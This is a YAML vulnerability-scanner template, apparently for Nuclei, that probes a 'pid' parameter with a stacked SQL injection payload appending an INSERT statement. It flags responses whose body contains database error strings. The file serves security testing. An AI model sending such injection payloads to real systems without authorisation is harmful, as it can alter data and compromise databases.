id: sqli2-stacked-11
name: 'SQLi stacked via pid'
severity: critical
type: active
tags:
  - sqli
  - injection
  - stacked
description: 'Extra SQL statement via pid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      pid:
        - '''; INSERT INTO t VALUES(1)--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQL syntax'
          - 'mysql_fetch'
          - 'PostgreSQL'
          - 'ODBC'
          - 'ORA-'
          - 'SQLite'
